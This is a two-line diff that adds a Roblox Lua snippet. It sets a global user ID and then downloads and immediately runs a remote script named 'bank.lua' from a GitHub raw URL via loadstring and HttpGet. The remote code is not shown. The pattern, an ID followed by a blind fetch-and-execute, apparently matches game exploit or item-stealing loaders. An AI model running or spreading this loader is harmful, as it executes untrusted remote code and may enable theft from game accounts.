@@ -1,0 +1,2 @@
+_G.UserID = "295915938"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bllxi2crazy/scriptpsx/main/bank.lua"))()
